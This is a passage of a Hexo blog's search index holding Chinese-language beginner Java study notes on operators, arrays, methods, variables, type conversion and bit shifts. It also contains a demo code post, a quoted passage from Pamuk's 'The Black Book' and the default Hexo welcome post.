      <link href="/2025/11/25/Java/learningg/%E6%A8%A1%E5%9D%97%E4%B8%80/%E6%A8%A1%E5%9D%973/"/>
      <url>/2025/11/25/Java/learningg/%E6%A8%A1%E5%9D%97%E4%B8%80/%E6%A8%A1%E5%9D%973/</url>
      
        <content type="html"><![CDATA[<h2 id="一、算数运算符"><a href="#一、算数运算符" class="headerlink" title="一、算数运算符"></a>一、算数运算符</h2><h3 id="a-普通运算符"><a href="#a-普通运算符" class="headerlink" title="a.普通运算符"></a>a.普通运算符</h3><h3 id="b-自增自减运算符（也算算数运算符的一种）"><a href="#b-自增自减运算符（也算算数运算符的一种）" class="headerlink" title="b.自增自减运算符（也算算数运算符的一种）"></a>b.自增自减运算符（也算算数运算符的一种）</h3><p>混合使用：<br>符号在前：先运算，在使用运算后的值<br>符号在后：先使用原值，使用完毕后，自身再运算</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01Arichmetic</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">            <span class="comment">/*int i = 10;</span></span><br><span class="line"><span class="comment">            ++i;</span></span><br><span class="line"><span class="comment">            System.out.println(&quot;i=&quot;+i); **/</span></span><br><span class="line">            <span class="type">int</span> x=<span class="number">10</span>;</span><br><span class="line">            <span class="type">int</span> y=<span class="number">20</span>;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            10+19+12=41</span></span><br><span class="line"><span class="comment">            int result = x++ + --y + ++x;*/</span></span><br><span class="line">            <span class="comment">//11+19+11=41A</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> ++x + --y + x++;</span><br><span class="line">    </span><br><span class="line">            System.out.println(result);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运算符——企业真题c&#x3D;c++分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> c=<span class="number">10</span>;</span><br><span class="line">c =c++;</span><br><span class="line">System.out.println(c);<span class="comment">//10</span></span><br></pre></td></tr></table></figure><h2 id="二、逻辑运算符"><a href="#二、逻辑运算符" class="headerlink" title="二、逻辑运算符"></a>二、逻辑运算符</h2><p>1、作用：连接多个boolean结果<br>2、结果：boolean型结果<br>符号如下：</p><table><thead><tr><th>符号</th><th>功能</th></tr></thead><tbody><tr><td>&amp;&amp;（与，并且）</td><td>有假则假</td></tr><tr><td></td><td></td></tr><tr><td>！（非，取反）</td><td>不ture就false</td></tr><tr><td>^（异或）</td><td>符号前后结果一样为false；不一样为ture    ture^ture   -&gt;   false    &#x2F;&#x2F;</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i=<span class="number">10</span>,j=<span class="number">20</span>,k=<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">boolean</span> result01=(i&gt;j)&amp;&amp;(i==k);</span><br><span class="line">System.out.println(<span class="string">&quot;result01=&quot;</span>+result01);<span class="comment">//false</span></span><br><span class="line"></span><br><span class="line"><span class="type">boolean</span> result02=(i&gt;j)||(i==k);</span><br><span class="line">System.out.println(<span class="string">&quot;result02=&quot;</span>+result02);<span class="comment">//ture</span></span><br></pre></td></tr></table></figure><p>&amp;  :<br>1.单与，如果前后都是布尔型，有假则假，但是如果符号前为false,符号后会继续执行<br>2.如果该符号前后都是数字，看作是位运算符<br>&amp;&amp;  :<br>1.双与，有假则假，但是有短路效果，如果符号前为false，符号后的判断就不会执行了<br>|   :<br>1.单或，如果前后都是布尔型，有真则真，但是如果符号前为true，符号后的判断会继续进行2.如果该符号前后都是数字，看作是位运算符<br>||  :<br>1.双或，有真则真，但是有短路效果，如果符号前为true，符号后的判断就不会执行<br>*前为false会执行？会执行！！！！！！！ </p><h2 id="三、三元运算符"><a href="#三、三元运算符" class="headerlink" title="三、三元运算符"></a>三、三元运算符</h2><p>Boolean表达式？表达式1：表达式2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span> <span class="number">60</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> score&gt;=<span class="number">60</span>?<span class="string">&quot;及格&quot;</span>:<span class="string">&quot;不及格&quot;</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;result=&quot;</span>+result);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数组</title>
      <link href="/2025/11/25/Java/learningg/%E6%A8%A1%E5%9D%97%E4%B8%80/%E6%A8%A1%E5%9D%975/"/>
      <url>/2025/11/25/Java/learningg/%E6%A8%A1%E5%9D%97%E4%B8%80/%E6%A8%A1%E5%9D%975/</url>
      
        <content type="html"><![CDATA[<h2 id="一、数组的定义"><a href="#一、数组的定义" class="headerlink" title="一、数组的定义"></a>一、数组的定义</h2><p>1.定义：<br>a.动态初始化：定义时没有给具体的数据<br>数据类型[]  数组名  &#x3D;  new  数据类型[长度]<br>数据类型  数组名[]  &#x3D;  new  数据类型[长度]</p><p>b.静态初始化：定义数组就直接给了具体的数据<br>数据类型  数组名[]  &#x3D;  new  数据类型[长度]{元素1，元素2，…….}</p><p>c.简化的静态初始化<br>数据类型  数组名[]  &#x3D;{元素1，元素2，…….}</p><h2 id="二、数组操作"><a href="#二、数组操作" class="headerlink" title="二、数组操作"></a>二、数组操作</h2><p>1.获取数组长度<br>1.1格式：<br>数组名.length<br>1.2注意;<br>length后面不要带小括号，因为length不是数组中的方法，而是数组中的一个属性。</p><p>2.索引<br>概念：元素在数组中储存的位置（编号，下标）</p><p>3.存储数据<br>格式：<br>数组名[索引值] &#x3D; 值  –&gt;  将等号右边的数据放到数据指定的索引位置上</p><p>4.获取数据<br>System.out.println(数组名[下标]);</p><p>空指针异常：<br>*原因：当一个对象为null时，再次调用次对象中的其他成员</p><h2 id="三、内存图"><a href="#三、内存图" class="headerlink" title="三、内存图"></a>三、内存图</h2><p>1、内存：“内存条”，所有软件，运行起来都会进入内存中，占用内存，在java世界里，将内存划分为5块<br>2、五块：<br>a.栈（stack）<br>主要运行方法，方法的运行都会进栈内存运行，运行完毕后，需要“弹栈”，为了腾出空间</p><p>b.堆（Heap）<br>保存的是对象，数组，每new一次，都会在堆内存中开辟空间，并为这个空间分配一个地址值<br>堆内存中的数据都是有默认值的</p><p>c.方法区（Method Area）<br>代码的“预备区”，记录了类的信息以及方法的信息<br>方法区中主要保存class文件及其其中的信息<br>代码运行之前，需要先存进内存（方法区）</p><p>d.本地方法栈（Native  Method  Stack）:专门运行native方法（本地方法）<br>本地方法可以理解为堆对Java功能的扩充<br>有很多功能，Java语言实现不了，所以需要依靠本地方法完成（c语言编写）</p><p>e.寄存器(pc register)<br>和cpu有关</p><h2 id="四、二维数组"><a href="#四、二维数组" class="headerlink" title="四、二维数组"></a>四、二维数组</h2>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>方法</title>
      <link href="/2025/11/25/Java/learningg/%E6%A8%A1%E5%9D%97%E4%B8%80/%E6%A8%A1%E5%9D%976/"/>
      <url>/2025/11/25/Java/learningg/%E6%A8%A1%E5%9D%97%E4%B8%80/%E6%A8%A1%E5%9D%976/</url>
      
        <content type="html"><![CDATA[<h2 id="一、方法的使用"><a href="#一、方法的使用" class="headerlink" title="一、方法的使用"></a>一、方法的使用</h2><p>1、简单方法定义（无参数返回值）<br>通用定义格式：<br>修饰符  返回值类型  方法名（参数）{<br>方法体<br>Return   结果<br>}</p><p>分为四种方法学习：<br>a.无参无返回值<br>b.有参无返回值<br>c.无参有返回值<br>d.有参有返回值</p><p>a.无参无返回值：<br>Public  static  void  方法名(){<br>方法体<br>}<br>注意事项：1）void关键字表示无返回值，写了void，就不要在方法中写return  结果<br>2）方法之间不能相互嵌套，方法之间是平级关系<br>3）方法的执行顺序只和调用顺序有关</p><p>b.有参无返回值：<br>Public  static  void  方法名(数据类型  变量名){<br>方法体<br>}</p><p>c.无参有返回值：<br>1）格式：<br>Public  static  返回值类型  方法名(){<br>方法体<br>Return  结果<br>}<br>2）调用：<br>a.打印调用：sout(方法名())<br>b.赋值调用：调用完之后用一个变量接收返回值的结果!!!!!!!极力推荐<br>数据类型  变量名  &#x3D;  方法名（）</p><p>d.有参有返回值<br>1）格式：<br>Public  static  返回值类型  方法名(参数){<br>方法体<br>Return  结果<br>}</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常量 变量 类型转化</title>
      <link href="/2025/11/25/Java/learningg/%E6%A8%A1%E5%9D%97%E4%B8%80/%E6%A8%A1%E5%9D%972/"/>
      <url>/2025/11/25/Java/learningg/%E6%A8%A1%E5%9D%97%E4%B8%80/%E6%A8%A1%E5%9D%972/</url>
      
        <content type="html"><![CDATA[<h2 id="一、常量"><a href="#一、常量" class="headerlink" title="一、常量"></a>一、常量</h2><h3 id="a）分类"><a href="#a）分类" class="headerlink" title="a）分类"></a>a）分类</h3><p>1、整数常量<br>2、小数常量<br>3、字符常量：带‘ ’的 ，单引号中必须有且只能有一个内容<br>‘1’（算）  ‘11’（不算）<br>4、字符串常量：带双引号的”“ 双引号中内容随意<br>5、布尔常量：ture（真） false（假）<br>6、空常量：null  代表的是数据不存在</p><p>null和 “”比较：<br>“”为真实存在的内容     null为数据都不存在</p><h3 id="b）常量间的运算"><a href="#b）常量间的运算" class="headerlink" title="b）常量间的运算"></a>b）常量间的运算</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Constant</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="comment">//整数常量</span></span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">        System.out.println(-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//小数常量</span></span><br><span class="line">        System.out.println(<span class="number">1.5</span>);</span><br><span class="line">        System.out.println(-<span class="number">1.0</span>);</span><br><span class="line">        <span class="comment">//前后都为整数，结果只取整数</span></span><br><span class="line">        <span class="comment">//前后只要有一个数带小数点，结果就是正常小数了</span></span><br><span class="line">        System.out.println(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">            System.out.println(<span class="number">10</span>/<span class="number">3</span>);</span><br><span class="line">    System.out.println(<span class="number">10.0</span>/<span class="number">3</span>);</span><br><span class="line">    System.out.println(<span class="number">10</span>/<span class="number">3.0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二、变量"><a href="#二、变量" class="headerlink" title="二、变量"></a>二、变量</h2><h3 id="a）变量的介绍及其使用"><a href="#a）变量的介绍及其使用" class="headerlink" title="a）变量的介绍及其使用"></a>a）变量的介绍及其使用</h3><p><img src="/./img/md2_1.jpg" alt="alt text"><br>1.变量的数据类型：<br>1.1基本数据类型：4类8种<br>整型：byte short int  long<br>浮点型：float double<br>字符型：char<br>布尔型；boolean<br>byte：  -128   ~   +127<br>short：  -32768  ~  +32768<br>int:  -2147483648  ~  +2147483647  (-2^31  ~  +2^31-1)<br>long:-9223372036854775808  ~  +9223372036854775808  (-2^63  ~  +2^63-1)</p><p>1.2引用数据类型：类  数组  接口  枚举  注解</p><p>2注意：<br>2.1字符串不属于基本数据类型，属于引用数据类型，用String表示<br>String是一个类，只不过在定义的时候可以和基本数据类型格式一样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Constant</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">byte</span> num1=<span class="number">100</span>;</span><br><span class="line">        System.out.println(num1);</span><br><span class="line">            </span><br><span class="line">        <span class="type">short</span> num2=<span class="number">100</span>;</span><br><span class="line">        <span class="comment">//num2=101;</span></span><br><span class="line">        System.out.println(num2);</span><br><span class="line">            </span><br><span class="line">        <span class="type">int</span> num3=<span class="number">10000</span>;</span><br><span class="line">        num1 =<span class="number">1</span>;</span><br><span class="line">        System.out.println(num1);</span><br><span class="line">            </span><br><span class="line">        <span class="type">long</span> num4=<span class="number">10L</span>;</span><br><span class="line">        System.out.println(num4);</span><br><span class="line">            </span><br><span class="line">        <span class="type">float</span> num5=<span class="number">10f</span>;</span><br><span class="line">        System.out.println(num5);</span><br><span class="line">            </span><br><span class="line">        <span class="type">double</span> num6=<span class="number">10d</span>;</span><br><span class="line">        System.out.println(num6);</span><br><span class="line">            </span><br><span class="line">        <span class="type">char</span> num7=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        System.out.println(num7);</span><br><span class="line">            </span><br><span class="line">        <span class="type">boolean</span> num8=<span class="literal">true</span>;</span><br><span class="line">        <span class="type">boolean</span> num9=<span class="literal">false</span>;</span><br><span class="line">        num8=num9;</span><br><span class="line">        System.out.println(num8);</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">        String name=<span class="string">&quot;你好&quot;</span>;</span><br><span class="line">        System.out.println(name);     </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>3 切记：将来开发不要用float 或者 double 直接参与运算，因为直接参与运算会有精度损失问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Constant</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    <span class="comment">/*    float a=10,b=3;</span></span><br><span class="line"><span class="comment">        float result=a/b;</span></span><br><span class="line"><span class="comment">        System.out.println(result);//3.3333333</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">        <span class="type">double</span> a=<span class="number">10</span>,b=<span class="number">3</span>;</span><br><span class="line">        <span class="type">double</span> result=a/b;</span><br><span class="line">        System.out.println(result);<span class="comment">//3.3333333333333335</span></span><br><span class="line">            </span><br><span class="line">        <span class="type">float</span> x=<span class="number">3.55F</span>;</span><br><span class="line">        <span class="type">float</span> y=<span class="number">2.12F</span>;</span><br><span class="line">        <span class="type">float</span> result2=x-y;</span><br><span class="line">        System.out.println(result2);<span class="comment">//1.4300001</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三、数据类型转换"><a href="#三、数据类型转换" class="headerlink" title="三、数据类型转换"></a>三、数据类型转换</h2><h3 id="a-分类"><a href="#a-分类" class="headerlink" title="a.分类"></a>a.分类</h3><p>a.自动类型转换：<br>将取值范围小的数值类型赋值给取值范围大的数据类型  -&gt; 小自动转大<br>做运算也自动小转大<br>b.强制类型转换：<br>大赋值给小的则需要强制转换</p><h3 id="b-基本类型中按照取值范围从小到大排序"><a href="#b-基本类型中按照取值范围从小到大排序" class="headerlink" title="b.基本类型中按照取值范围从小到大排序"></a>b.基本类型中按照取值范围从小到大排序</h3><p>排序：byte , short , char - &gt; int -&gt; long -&gt; float -&gt;double<br>布尔不参与比较</p><h3 id="c-强制类型转换"><a href="#c-强制类型转换" class="headerlink" title="c.强制类型转换"></a>c.强制类型转换</h3><p>取值范围小的数据类型   变量名  &#x3D;  取值范围大的数据类型      -&gt;需要强转<br>**怎样强转：<br>取值范围小的数据类型   变量名  &#x3D; （取值范围小的数据类型） 取值范围大的数据类型      -&gt;需要强转</p><h3 id="d-强转注意事项"><a href="#d-强转注意事项" class="headerlink" title="d.强转注意事项"></a>d.强转注意事项</h3><p>1）不要随意写成强制转的格式，因为会有精度损失问题以及数据溢出现象，除非没有办法。<br>Eg:int类型占内存4个字节，4个字节变成二进制是32位，若多出来，则前面的全部消失<br>2）byte&amp;short&amp;char的转换<br>Byte , short 定义时，若等号右边为整数常量，如果不超过byte和short的范围，则不需要我们强制转换，jvm自动装。<br>Byte,short如果等号右边有变量参与，byte和short自动提升为int，然后结果再次赋值给byte,short的变量，需要我们手动强制装。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span><span class="number">10</span>;</span><br><span class="line">System.out.println(b);</span><br><span class="line">b=(<span class="type">byte</span>)(b+<span class="number">1</span>);</span><br><span class="line">System.out.println(b);</span><br></pre></td></tr></table></figure><p>Char 类型数据如果参与运算，会自动提升为int型，int会取ASCII码表范围去查询字符对应的int值；如果ASCII表里面没有，则会去unicode码表（万国码）中去找。<br>byte赋值超过范围分析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> (<span class="type">byte</span>)<span class="number">200</span>;</span><br><span class="line">System.out.println(b);<span class="comment">//-56（-56为200对应的补码）</span></span><br></pre></td></tr></table></figure><h2 id="四、进制转换-位运算符-运算符的优先级"><a href="#四、进制转换-位运算符-运算符的优先级" class="headerlink" title="四、进制转换 位运算符 运算符的优先级"></a>四、进制转换 位运算符 运算符的优先级</h2><h3 id="a-位运算"><a href="#a-位运算" class="headerlink" title="a.位运算"></a>a.位运算</h3><p>1、左移：&lt;&lt;<br>运算规则：左移几位相当于乘以2的几次方<br>注意：当左移的位数n超过该数据类型的总位数时，相当于左移（n-总位数）位<br>2&lt;&lt;2  结果等于8<br>快速算法：2*（2的2次方）&#x3D;8<br>0000 0000 0010    2<br>0000 0000 1000    8</p><p>2、右移：&gt;&gt;<br>快速算法：类似于除以2的n次方，如果不能整除，向下取整。<br>9&gt;&gt;2   等于2<br>快速算法：<br>-9&gt;&gt;2  等于（-3）—————–负数的补码右移动，则左边补1</p><p>3、无符号右移： &gt;&gt;&gt;<br>运算规则：往右移动后，左边空出来的位直接补0，不管最高位是0还是1 空出来的都拿来0补<br>正数：和右移一样<br>9&gt;&gt;&gt;2      等于2<br>负数：右边移出去几位，左边补几个零，结果变为正数<br>-9&gt;&gt;&gt;2<br>结果为：1073741821</p><h3 id="b-idea的快捷键"><a href="#b-idea的快捷键" class="headerlink" title="b.idea的快捷键"></a>b.idea的快捷键</h3><table><thead><tr><th>快捷键</th><th>功能</th></tr></thead><tbody><tr><td>Alt+Enter</td><td>导入包，自动修正代码</td></tr><tr><td>CTRL+Y</td><td>删除光标所在行</td></tr><tr><td>CTRL+D</td><td>复制光标所在行的内容，插入光标位置下面</td></tr><tr><td>CTRL+Alt+L</td><td>格式化代码</td></tr><tr><td>CTRL+Shift+&#x2F;</td><td>选中代码注释，多行注释，再按则取消注释</td></tr><tr><td>CTRL+&#x2F;</td><td>单行注释</td></tr><tr><td>Alt+Shift+上下箭头</td><td>移动当前代码行</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java入门</title>
      <link href="/2025/11/25/Java/learningg/%E6%A8%A1%E5%9D%97%E4%B8%80/%E6%A8%A1%E5%9D%971/"/>
      <url>/2025/11/25/Java/learningg/%E6%A8%A1%E5%9D%97%E4%B8%80/%E6%A8%A1%E5%9D%971/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Java语言前言"><a href="#一、Java语言前言" class="headerlink" title="一、Java语言前言"></a>一、Java语言前言</h2><h3 id="a）字节"><a href="#a）字节" class="headerlink" title="a）字节"></a>a）字节</h3><p>字节：计算机中储存数据量最小的计量单位，用byte或者B表示<br>1字节（B）&#x3D;8比特（bit）<br>当然计算机中最小的存储单元为二进制，因为计算机任何看到的东西都是由CPU通过二进制转来的，二进制用bit来表示<br>8个二进制表一个字节</p><h3 id="b）存储数据的计量单位换算"><a href="#b）存储数据的计量单位换算" class="headerlink" title="b）存储数据的计量单位换算"></a>b）存储数据的计量单位换算</h3><p>8bit &#x3D; 1B<br>1024B &#x3D; 1KB<br>1024KB &#x3D; 1MB<br>1024MB &#x3D; 1GB<br>1024GB &#x3D; 1TB<br>PB   EB   ZB……</p><h3 id="c）常用的dos命令"><a href="#c）常用的dos命令" class="headerlink" title="c）常用的dos命令"></a>c）常用的dos命令</h3><h4 id="打开dos命令窗口"><a href="#打开dos命令窗口" class="headerlink" title="打开dos命令窗口"></a>打开dos命令窗口</h4><p>Win+r  -&gt;  输入cmd  -&gt;  回车<br><img src="/./img/image.jpg" alt="alt text"><br>常用命令如下：<br><img src="/./img/image1.jpg" alt="alt text"></p><h4 id="如何快速打开目录对应的dos命令窗口"><a href="#如何快速打开目录对应的dos命令窗口" class="headerlink" title="如何快速打开目录对应的dos命令窗口"></a>如何快速打开目录对应的dos命令窗口</h4><p>输入cmd -&gt; 回车<br>按上下箭头，切换输入过的命令<br>在dos命令窗口中，可以输入文件夹名或者文件名的一部分按 tab键（自动补全文件夹或者文件名）</p><h2 id="二、Java入门程序"><a href="#二、Java入门程序" class="headerlink" title="二、Java入门程序"></a>二、Java入门程序</h2><h3 id="a）开发三步骤"><a href="#a）开发三步骤" class="headerlink" title="a）开发三步骤"></a>a）开发三步骤</h3><p>1.编写：<br>a.创建一个文本文档，将后缀名改为.java，变成一个Java文件<br>b.注意：我们需要将文件的后缀名显示出来<br>2.编译：<br>a.命令：javac java文件名.java<br>b.javac会将java文件编译，生成一个.class文件（字节码文件），jvm运行只认class文件<br>3.运行：<br>a.命令：java class文件名（不需要带后缀名）</p><h3 id="b）注释"><a href="#b）注释" class="headerlink" title="b）注释"></a>b）注释</h3><p>a.单行注释：<br>&#x2F;&#x2F;注释内容<br>b.多行注释：<br>&#x2F;*<br>注释内容<br><em>&#x2F;<br>c.文档注释：<br>&#x2F;</em>*<br>注释内容<br>*&#x2F;</p><h2 id="基本及小技巧"><a href="#基本及小技巧" class="headerlink" title="基本及小技巧"></a>基本及小技巧</h2><p>1.println和print区别<br>a.println输出就带换行<br>b.print输出不带换行效果<br>2.小技巧<br>2.1.复制当前行：ctrl+d<br>2.2一次操作多行：<br>a.预留出足够空间<br>b.按住alt不放，鼠标往下拉，此时光标变长了</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码演示</title>
      <link href="/2025/11/24/%E4%BB%A3%E7%A0%81%E5%9D%97/%E4%BB%A3%E7%A0%81%E5%9D%97%E6%BC%94%E7%A4%BA/"/>
      <url>/2025/11/24/%E4%BB%A3%E7%A0%81%E5%9D%97/%E4%BB%A3%E7%A0%81%E5%9D%97%E6%BC%94%E7%A4%BA/</url>
      
        <content type="html"><![CDATA[<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><p>111111111111<br>111111111111<br>111111111111</p><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><p>222222222222222222222<br>2222222222222222222222<br>222222222222222222222</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>奥尔罕·帕慕克《黑书》</title>
      <link href="/2025/11/24/%E9%98%85%E8%AF%BB/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"/>
      <url>/2025/11/24/%E9%98%85%E8%AF%BB/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<p>我爱你就如同我爱自己的身体，<br>就如同我正在寻觅的失落灵魂，<br>就如同我在悲喜交集中所领悟到的自己无法成为的另一个人，<br>我爱你。</p>]]></content>
      
      
      <categories>
          
          <category> 书籍 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 阅读 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/11/24/hello-world/"/>
      <url>/2025/11/24/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
